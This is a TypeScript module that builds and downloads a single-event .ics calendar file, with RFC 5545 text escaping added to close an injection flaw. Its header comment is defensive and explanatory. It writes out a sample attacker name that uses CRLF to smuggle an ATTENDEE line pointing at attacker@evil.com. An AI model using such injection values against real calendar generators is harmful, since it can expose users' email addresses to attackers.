/**
 * BAL-283 — the `.ics` download builder, EXTRACTED from `step-booked.tsx` so
 * `step-booked-intro-call.tsx` can reuse it verbatim rather than forking a second copy (which
 * would trip the SonarCloud new-code duplication gate). Because it is shared, ONE fix here
 * covers BOTH booking surfaces.
 *
 * ⚠⚠ EVERY INTERPOLATED VALUE IS ESCAPED — RFC 5545 §3.3.11 (round-1 security MEDIUM). The
 * extracted original wrote `SUMMARY:${summary}` raw, and the BAL-283 caller interpolates the
 * COUNTERPARTY's name (`step-booked-intro-call.tsx`). A newline is reachable in a first name on
 * BOTH write paths — onboarding's `name-step.tsx` (`.min(1).max(50)`, no character restriction)
 * and `update-name.ts` (`.regex(/^[^<>]*$/)`, and `[^<>]` matches `\n`, while `.trim()` strips
 * only OUTER whitespace). An expert named
 * `Dana\r\nATTENDEE;CN=Dana:mailto:attacker@evil.com` therefore injected an attacker-chosen
 * ATTENDEE into the client's downloaded calendar file — and many clients mail invite responses
 * to every ATTENDEE, which is the ADR-1044 counterparty-address disclosure reached sideways
 * through a calendar file. `BEGIN:VALARM` and `URL:` are equally injectable the same way.
 */
export interface DownloadIcsEventInput {
  summary: string;
  startIso: string;
  durationMinutes: number;
  /** Defaults derived from `summary` when omitted. */
  filename?: string;
}

function icsTimestamp(date: Date): string {
  const [stamp] = date.toISOString().replace(/[-:]/g, '').split('.');
  return `${stamp ?? ''}Z`;
}

/**
 * RFC 5545 §3.3.11 TEXT escaping, plus an absolute ban on raw line breaks.
 *
 * ⚠ ORDER IS LOAD-BEARING: the backslash MUST be doubled FIRST, or the escapes introduced by
 * the later replacements would themselves be escaped again.
 *
 * ⚠ A LINE BREAK BECOMES THE TWO-CHARACTER SEQUENCE `\n`, NOT A REAL ONE. That is what makes
 * this a structural fix rather than a cosmetic one: after this, no input can start a new
 * content line, so no input can name a new property (`ATTENDEE`, `URL`) or a new component
 * (`BEGIN:VALARM`). CR, LF and CRLF all collapse to the same escape.
 *
 * ⚠ FOUR FLAT, LINEAR REGEXES — no nested quantifiers and no alternation over overlapping
 * branches, so SonarCloud S5852 (super-linear backtracking) does not apply.
 */
function escapeIcsText(value: string): string {
  return value
    .replace(/\\/g, '\\\\')
    .replace(/\r\n|\r|\n/g, '\\n')
    .replace(/;/g, '\\;')
    .replace(/,/g, '\\,');
}

/** Build and trigger the download of a minimal single-event `.ics` file. */
export function downloadIcsEvent({
  summary,
  startIso,
  durationMinutes,
  filename,
}: Readonly<DownloadIcsEventInput>): void {
  const start = new Date(startIso);
  const end = new Date(start.getTime() + durationMinutes * 60_000);
  const lines = [
    'BEGIN:VCALENDAR',
    'VERSION:2.0',
    // ⚠ `PRODID` is REQUIRED by RFC 5545 §3.6 and several clients reject a VCALENDAR without
    // one. A constant, so it carries no user input and needs no escaping.
    'PRODID:-//Balo//Balo Booking//EN',
    'BEGIN:VEVENT',
    // ⚠ `UID` + `DTSTAMP` are REQUIRED on a VEVENT. Without a UID, two downloads of DIFFERENT
    // calls can be treated as the same event by the importing client and silently overwrite
    // each other. `crypto.randomUUID()` is browser-native and this function only ever runs from
    // a click handler.
    `UID:${crypto.randomUUID()}@balo.expert`,
    `DTSTAMP:${icsTimestamp(new Date())}`,
    `DTSTART:${icsTimestamp(start)}`,
    `DTEND:${icsTimestamp(end)}`,
    `SUMMARY:${escapeIcsText(summary)}`,
    'END:VEVENT',
    'END:VCALENDAR',
  ].join('\r\n');
  const blob = new Blob([lines], { type: 'text/calendar' });
  const url = globalThis.URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename ?? 'event.ics';
  link.click();
  globalThis.URL.revokeObjectURL(url);
}
